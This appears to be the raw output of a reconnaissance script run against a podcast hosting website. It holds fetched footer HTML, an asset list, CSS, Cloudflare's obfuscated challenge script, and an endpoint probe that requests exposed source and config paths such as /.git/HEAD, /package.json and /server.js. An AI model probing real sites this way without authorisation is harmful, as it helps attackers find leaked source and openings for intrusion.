+        <p class="foot-tag">Podcast hosting, analytics, and shareable audiograms. Independent since 2016.</p>
+      </div>
+      <div class="foot-col"><h4>Product</h4><a href="/features">Features</a><a href="/pricing">Pricing</a><a href="/studio">Studio</a></div>
+      <div class="foot-col"><h4>Company</h4><a href="/about">About</a><a href="/about">Careers</a><a href="/about">Contact</a></div>
+      <div class="foot-col"><h4>Creators</h4><a href="/studio">Open Studio</a><a href="/features">Audiograms</a><a href="/pricing">Plans</a></div>
+    </div>
+    <div class="foot-rule"><div class="wrap">&copy; 2016&ndash;2026 Tapedeck Media. Hosting for people who take the show seriously.</div></div>
+  </footer>
+<script>(function(){function c(){var b=a.contentDocument||(a.contentWindow&&a.contentWindow.document);if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a410583d4ef72251',t:'MTc5MDQwNTUzNA=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"b555bf0b6ced40d5b5d7fd21b269244b","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
+
+
+
+################ referenced assets ################
+  /
+  /about
+  /cdn-cgi/challenge-platform/scripts/jsd/main.js
+  /features
+  /pricing
+  /public/css/site.css
+  /studio
+  /studio/upload
+  data:,
+  https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495
+
+===== /cdn-cgi/challenge-platform/scripts/jsd/main.js (200, 19839b) =====
+window._cf_chl_opt = {fDDOx7:"b"};~function(Db,I,L,d,F,e,p,H,E,z,b,a,j,T,U,O){Db=S,function(l,R,Sl,Dz,f,X){for(Sl={l:372,R:400,f:408,X:404,P:409,x:334,q:374,J:329,C:356,Z:426,D0:479},Dz=S,f=l();!![];)try{if(X=-parseInt(Dz(Sl.l))/1+parseInt(Dz(Sl.R))/2+parseInt(Dz(Sl.f))/3+parseInt(Dz(Sl.X))/4*(-parseInt(Dz(Sl.P))/5)+-parseInt(Dz(Sl.x))/6*(parseInt(Dz(Sl.q))/7)+-parseInt(Dz(Sl.J))/8*(parseInt(Dz(Sl.C))/9)+parseInt(Dz(Sl.Z))/10*(parseInt(Dz(Sl.D0))/11),R===X)break;else f.push(f.shift())}catch(P){f.push(f.shift())}}(D,737812),I=this||self,L=I[Db(390)],d={},d[Db(407)]=`o`,d[Db(447)]=`s`,d[Db(381)]=`u`,d[Db(468)]=`z`,d[Db(337)]=`n`,d[Db(303)]=`I`,F=d,I[Db(469)]=function(R,f,X,P,Sz,SE,SH,Dt,x,C,Z,D0,D1,D2,D3,D4){if(Sz={l:297,R:418,f:388,X:332,P:388,x:369,q:470,J:512,C:470,Z:350,D0:367,D1:375,D2:306,D3:520,D4:425,D5:301,D6:443,D7:495},SE={l:480,R:306,f:325},SH={l:397,R:465,f:473,X:543},Dt=Db,x={"KtlUM":function(D5,D6){return D5<D6},"vpoIB":function(D5,D6,D7){return D5(D6,D7)},"PmtnA":function(D5,D6){return D5(D6)},"MuzMJ":function(D5,D6){return D6===D5},"hjEeS":Dt(Sz.l),"KteOi":function(D5,D6,D7){return D5(D6,D7)}},f===null||void 0===f)return P;for(C=c(f),R[Dt(Sz.R)][Dt(Sz.f)]&&(C=C[Dt(Sz.X)](R[Dt(Sz.R)][Dt(Sz.P)](f))),C=R[Dt(Sz.x)][Dt(Sz.q)]&&R[Dt(Sz.J)]?R[Dt(Sz.x)][Dt(Sz.C)](new R[Dt(Sz.J)](C)):function(D5,Dm,D6){for(Dm=Dt,D5[Dm(SE.l)](),D6=0;D6<D5[Dm(SE.R)];D5[D6]===D5[D6+1]?D5[Dm(SE.f)](D6+1,1):D6+=1);return D5}(C),Z=`nAsAa`.split(`A`),Z=Z[Dt(Sz.Z)][Dt(Sz.D0)](Z),D0=0;x[Dt(Sz.D1)](D0,C[Dt(Sz.D2)]);D0++){D2=(D1=C[D0],X+D1);try{D3=f[D1],D4=x[Dt(Sz.D3)](A,R,D3),x[Dt(Sz.D4)](Z,D4)?(D1=+D3,D1=D4===`s`&&D1===D1,x[Dt(Sz.D5)](D2,x[Dt(Sz.D6)])?J(D2,D4):D1||J(D2,D3)):x[Dt(Sz.D7)](J,D2,D4)}catch(D5){J(D2,`i`)}}return P;function J(D5,D6,DW){DW=Dt,Object[DW(SH.l)][DW(SH.R)][DW(SH.f)](P,D6)||(P[D6]=[]),P[D6][DW(SH.X)](D5)}},e=[Db(440),Db(429),Db(472),Db(355),Db(442),Db(366),Db(428),Db(540),Db(515),Db(482),Db(541),Db(452),Db(343),Db(455),Db(542),Db(416),Db(469),Db(485),Db(484),Db(324),Db(322)],p=e[Db(350)][Db(367)](e),I[Db(485)]=function(R,f,Sj,Dk,X,P,x,q,J,C,Z){for(Sj={l:457,R:306,f:422,X:497,P:439,x:543},Dk=Db,X={"oZBxJ":function(D0,D1){return D0<D1},"pNJPu":function(D0,D1){return D0(D1)}},P=Object[Dk(Sj.l)](f),x=0;x<P[Dk(Sj.R)];x++)for(q=P[x],J=`f`===q?`N`:q,J=R[J]||(R[J]=[]),q=f[q],C=0;X[Dk(Sj.f)](C,q[Dk(Sj.R)]);Z=q[C],J[Dk(Sj.X)](Z)!==-1||X[Dk(Sj.P)](p,Z)||J[Dk(Sj.x)](`o.`+Z),C++);},H=function(v7,v6,v4,v2,v1,SZ,SJ,DT,l,R,f,X,P,x,q,C,Z,D0){for(v7={l:483,R:488,f:487,X:483},v6={l:461,R:306,f:321,X:298,P:530,x:466,q:377,J:391,C:365,Z:498,D0:498,D1:523,D2:389,D3:364,D4:395,D5:483},v4={l:318,R:430,f:490},v2={l:310},v1={l:379,R:387,f:306,X:451},SZ={l:371},SJ={l:530},DT=Db,l={"MpzDA":function(D1,D2){return D1<<D2},"FGcJr":function(D1,D2){return D1>=D2},"ydBot":function(D1,D2){return D2&D1},"tJLRd":function(D1,D2,D3){return D1(D2,D3)},"EeTto":function(D1,D2){return D1<=D2},"YUUFI":function(D1,D2){return D1^D2},"FFwCI":function(D1,D2,D3){return D1(D2,D3)},"kDaqi":function(D1,D2){return D1<D2},"XEVQi":function(D1,D2){return D1<D2},"ZaRCz":function(D1,D2){return D1<D2},"rhwkl":function(D1,D2){return D1<D2},"xnGyF":function(D1,D2){return D1>D2},"rgGfL":function(D1,D2){return D2&D1},"JwtlE":function(D1,D2){return D1<D2},"xLYjA":function(D1,D2){return D1+D2},"PBsUg":function(D1,D2){return D1(D2)},"jJmYK":function(D1,D2){return D1+D2},"soGPY":function(D1,D2){return D1<D2},"DesSj":function(D1,D2){return D1-D2}},R=[],f=[],X=[3,4,5,6,7,8,9,10,11,13,15,17,19,23,27,31,35,43,51,59,67,83,99,115,131,163,195,227,258],P=[0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0],x=[1,2,3,4,5,7,9,13,17,25,33,49,65,97,129,193,257,385,513,769,1025,1537,2049,3073,4097,6145,8193,12289,16385,24577],q=[0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13],C=0;C<288;C<144?(Z=l[DT(v7.l)](48,C),D0=8):l[DT(v7.R)](C,256)?(Z=l[DT(v7.f)](400+C,144),D0=9):C<280?(Z=C-256,D0=7):(Z=l[DT(v7.f)](l[DT(v7.X)](192,C),280),D0=8),R[C]=J(Z,D0),f[C]=D0,C++);return function(D1,
+
+===== /public/css/site.css (200, 8761b) =====
+@font-face{font-family:"Inter";font-weight:400;font-display:swap;src:url("/public/fonts/inter-400.woff2") format("woff2")}
+@font-face{font-family:"Inter";font-weight:500;font-display:swap;src:url("/public/fonts/inter-500.woff2") format("woff2")}
+@font-face{font-family:"Inter";font-weight:600;font-display:swap;src:url("/public/fonts/inter-600.woff2") format("woff2")}
+@font-face{font-family:"JetBrains Mono";font-weight:500;font-display:swap;src:url("/public/fonts/jetbrains-mono-500.woff2") format("woff2")}
+
+:root{
+  --bg:#ffffff; --bg-2:#f6f7f8; --ink:#111827; --ink-2:#475569; --muted:#8b95a3;
+  --line:#e7e9ee; --line-2:#eef0f3; --accent:#0f766e; --accent-2:#0d9488; --accent-soft:#e6f4f1;
+  --sans:"Inter",system-ui,-apple-system,"Segoe UI",Roboto,sans-serif; --mono:"JetBrains Mono",ui-monospace,Menlo,monospace;
+}
+*{box-sizing:border-box}
+html{min-height:100%}
+html,body{margin:0}
+body{background:var(--bg);color:var(--ink);font-family:var(--sans);font-size:15px;line-height:1.6;-webkit-font-smoothing:antialiased;min-height:100vh;display:flex;flex-direction:column}
+main{flex:1 0 auto}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1120px;margin:0 auto;padding:0 26px}
+.mono{font-family:var(--mono);font-variant-numeric:tabular-nums}
+.eyebrow{display:inline-block;font-size:12px;font-weight:600;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:14px}
+
+/* buttons */
+.btn{display:inline-flex;align-items:center;gap:8px;border-radius:8px;padding:11px 18px;font-weight:600;font-size:14px;cursor:pointer;border:1px solid transparent;font-family:var(--sans);transition:.15s}
+.btn-solid{background:var(--ink);color:#fff}
+.btn-solid:hover{background:#000}
+.btn-ghost{background:#fff;color:var(--ink);border-color:var(--line)}
+.btn-ghost:hover{border-color:var(--ink)}
+.btn[disabled]{opacity:.45;cursor:not-allowed}
+
+/* nav */
+.nav{border-bottom:1px solid var(--line);background:rgba(255,255,255,.9);backdrop-filter:blur(8px);position:sticky;top:0;z-index:20}
+.nav-inner{display:flex;align-items:center;height:66px;gap:28px}
+.brand{display:inline-flex;align-items:center;gap:10px}
+.brand-mark{width:26px;height:26px;border-radius:7px;background:linear-gradient(135deg,var(--accent-2),#0b5c55);position:relative;flex:none}
+.brand-mark::after{content:"";position:absolute;left:7px;top:7px;width:12px;height:12px;border-radius:3px;border:2px solid rgba(255,255,255,.85)}
+.brand-word{font-weight:700;font-size:18px;letter-spacing:-.01em}
+.nav-links{display:flex;gap:6px;margin-left:8px}
+.nav-links a{padding:8px 12px;border-radius:7px;color:var(--ink-2);font-weight:500;font-size:14px}
+.nav-links a:hover{color:var(--ink);background:var(--bg-2)}
+.nav-links a.on{color:var(--ink)}
+.nav-cta{margin-left:auto;display:flex;gap:10px;align-items:center}
+
+/* hero */
+.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,#fff, var(--bg-2))}
+.hero-inner{display:grid;grid-template-columns:1.05fr .95fr;gap:52px;align-items:center;padding:76px 0}
+.hero h1{font-size:46px;line-height:1.05;letter-spacing:-.02em;margin:0 0 18px;font-weight:600}
+.hero p{font-size:18px;color:var(--ink-2);margin:0 0 26px;max-width:520px}
+.hero-cta{display:flex;gap:12px;flex-wrap:wrap}
+.hero-stats{display:flex;gap:36px;margin-top:38px}
+.hero-stats .n{display:block;font-size:26px;font-weight:700;letter-spacing:-.01em}
+.hero-stats .l{font-size:12.5px;color:var(--muted)}
+.hero-art img{width:100%;border-radius:16px;border:1px solid var(--line);box-shadow:0 24px 60px -30px rgba(15,23,42,.4);display:block;aspect-ratio:4/3.4;object-fit:cover}
+
+/* bands / sections */
+.band{padding:72px 0;border-bottom:1px solid var(--line)}
+.band-head,.page-head{max-width:640px;margin-bottom:34px}
+.band-head h2,.page-head h1{font-size:30px;letter-spacing:-.02em;margin:0;font-weight:600}
+.page-head p{color:var(--ink-2);margin:10px 0 0;font-size:16px}
+.grid-3{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.card{background:#fff;border:1px solid var(--line);border-radius:1
+
+################ endpoint probe ################
+     404 /api                     ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /api/studio              ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /upload                  ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /api/upload              ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /render                  ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /api/render              ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /audiogram               ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /api/audiogram           ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /download                ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /exports                 ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /export                  ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /studio/upload           ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /studio/render           ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /studio/export           ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /workspace               ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /.git/HEAD               ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /package.json            ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /server.js               ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /app.js                  ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /source                  ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+***  200 /robots.txt              ct=text/plain; charset=utf- # As a condition of accessing this website, you agree to abide by the following # content signals: #
+     404 /public/                 ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /public/img/             ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /uploads/                ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+     404 /tmp/                    ct=text/html; charset=utf-8 <!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=
+
+DONE
